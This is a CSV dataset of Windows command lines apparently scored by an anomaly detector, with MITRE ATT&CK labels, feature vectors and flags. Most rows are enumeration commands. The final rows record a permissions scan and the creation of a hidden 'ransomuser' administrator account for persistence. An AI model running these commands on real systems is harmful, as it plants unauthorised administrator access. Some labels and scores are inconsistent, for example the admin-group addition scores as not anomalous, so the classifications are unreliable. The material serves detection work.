commandline,Analysis,is_anomaly,anomaly_score,behavioral_complexity,feature_vector,behavioral_flags
systeminfo,System Information Enumeration | Category: System Information Discovery | OS: Windows | MITRE: T1082 (System Information Discovery) | Tactic: DISCOVERY | Confidence: High,False,0.16163088033230677,0.0,"{'length': 10, 'num_args': 1, 'has_path': False, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': True, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': False, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}",[]
net config workstation,Unknown Activity,False,0.09138427100416381,0.0,"{'length': 22, 'num_args': 3, 'has_path': False, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': False, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}",[]
net view,Network Computer Enumeration | Category: Share and Session Enumeration | OS: Windows,False,0.19973022862996095,0.0,"{'length': 8, 'num_args': 2, 'has_path': False, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': False, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}",[]
dir C:\Users\,Unknown Activity,False,0.09953265079717107,0.0,"{'length': 13, 'num_args': 2, 'has_path': True, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': True, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}",[]
"wmic logicaldisk get size,freespace,caption",Logical Disk Enumeration | Category: System Information Discovery | OS: Windows,False,0.05750013275679966,0.0,"{'length': 43, 'num_args': 4, 'has_path': False, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': False, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}",['UNUSUAL_EXEC_METHOD']
whoami /all,Current User Context Check | Category: Network Discovery | OS: Cross-Platform,False,0.13857069860368307,0.0,"{'length': 11, 'num_args': 2, 'has_path': True, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': False, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}",[]
net localgroup administrators,Administrators Group Members Enumeration | Category: User and Group Management | OS: Windows,False,0.23588823212389523,0.0,"{'length': 29, 'num_args': 3, 'has_path': False, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': True, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': False, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}",['ADMIN_GROUP_MODIFICATION']
"accesschk.exe -uwcqv ""Authenticated Users"" * /accepteula",Unknown Activity,True,0.6348771582000371,0.0,"{'length': 56, 'num_args': 6, 'has_path': True, 'has_network': False, 'has_encoded': False, 'has_execution': True, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': True, 'has_user': True, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}",[]
net user ransomuser StrongPass123! /add,User Account Creation | Category: User and Group Management | OS: Windows | MITRE: T1136.001 (Create Account: Local Account) | Tactic: PERSISTENCE | Confidence: High,False,0.1341429174725519,0.0,"{'length': 39, 'num_args': 5, 'has_path': True, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': True, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}",['USER_CREATION']
net localgroup administrators ransomuser /add,Local Group Member Added | Category: User and Group Management | OS: Windows | MITRE: T1078.003 (Valid Accounts: Local Accounts) | Tactic: PERSISTENCE | Confidence: High,False,0.02343680196910461,0.0,"{'length': 45, 'num_args': 5, 'has_path': True, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': True, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': True, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}",['ADMIN_GROUP_MODIFICATION']
